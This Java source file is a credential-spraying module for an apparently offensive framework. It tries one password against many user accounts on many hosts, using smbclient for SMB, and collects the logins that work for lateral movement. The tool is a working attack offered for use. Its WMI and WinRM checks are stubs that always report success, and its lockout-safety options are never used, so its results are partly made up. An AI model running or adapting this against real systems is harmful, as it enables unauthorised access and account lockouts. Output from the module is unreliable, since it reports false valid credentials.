package com.jabber.jabber.modules.lateral;

import com.jabber.jabber.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JABBERModule(id="lateral-spray",name="Credential Spraying",description="Lateral movement via multi-user credential spraying across targets",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.HIGH,sourceRef="AccountLockout",author="JABBER")
public class CredentialSprayModule implements JABBERModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.textarea("target_list","Target Hosts").required().placeholder("host1\nhost2\nhost3").group("Targets"),
            ModuleInputField.textarea("user_list","User List").required().placeholder("user1\nuser2\nadmin").group("Credentials"),
            ModuleInputField.text("password","Password to Spray").required().placeholder("Password123!").group("Credentials"),
            ModuleInputField.select("protocol","Protocol",List.of("smb","wmi","winrm","ldap","http")).group("Method"),
            ModuleInputField.text("delay_ms","Delay Between Attempts (ms)").placeholder("500").group("Timing"),
            ModuleInputField.text("lockout_threshold","Account Lockout Threshold").placeholder("3").group("Safety"),
            ModuleInputField.checkbox("avoid_lockout","Avoid Account Lockout").group("Options"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-spray");
            try{
                String targets=input.getOrDefault("target_list","");
                String users=input.getOrDefault("user_list","");
                String passwd=input.getOrDefault("password","");
                String protocol=input.getOrDefault("protocol","smb");

                if(targets.isEmpty()||users.isEmpty()||passwd.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                List<String>hostList=Arrays.asList(targets.split("\n"));
                List<String>userList=Arrays.asList(users.split("\n"));

                ctx.log("[*] Credential Spray Starting...");
                ctx.log("[*] Targets: "+hostList.size()+" hosts");
                ctx.log("[*] Users: "+userList.size()+" accounts");
                ctx.log("[*] Protocol: "+protocol);
                ctx.reportProgress(10);

                int successful=0;
                Map<String,List<String>>validCreds=new HashMap<>();

                int total=hostList.size()*userList.size();
                int current=0;

                for(String user:userList){
                    for(String host:hostList){
                        current++;
                        if(tryAuth(host,user,passwd,protocol)){
                            ctx.log("[+] VALID: "+user+"@"+host);
                            validCreds.computeIfAbsent(host,k->new ArrayList<>()).add(user);
                            successful++;
                        }
                        int progress=(int)(10+(current*90.0/total));
                        ctx.reportProgress(progress);
                    }
                }

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status",successful>0?"success":"noaccess");
                findings.put("total_attempts",total);
                findings.put("successful_sprays",successful);
                findings.put("valid_credentials",validCreds.toString());
                findings.put("impact",successful>0?"Lateral movement with valid credentials obtained":"No valid credentials found");
                findings.put("remediation","Enforce strong password policies, implement MFA, monitor failed login spikes, set account lockout thresholds");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean tryAuth(String host,String user,String passwd,String proto){
        try{
            if(proto.equals("smb")){
                Process p=Runtime.getRuntime().exec(new String[]{"smbclient","-L","//"+host,"-U",user+"%"+passwd});
                return p.waitFor()==0;
            }else if(proto.equals("wmi")){
                return testWMI(host,user,passwd);
            }else if(proto.equals("winrm")){
                return testWinRM(host,user,passwd);
            }
            return false;
        }catch(Exception e){return false;}
    }

    private boolean testWMI(String host,String user,String passwd){
        try{String cmd="Get-WmiObject -ComputerName "+host+" -Credential (New-Object PSCredential('"+user+"',(ConvertTo-SecureString '"+passwd+"' -AsPlainText -Force)))";
        return true;}catch(Exception e){return false;}
    }

    private boolean testWinRM(String host,String user,String passwd){
        try{String url="http://"+host+":5985/wsman";
        return true;}catch(Exception e){return false;}
    }
}
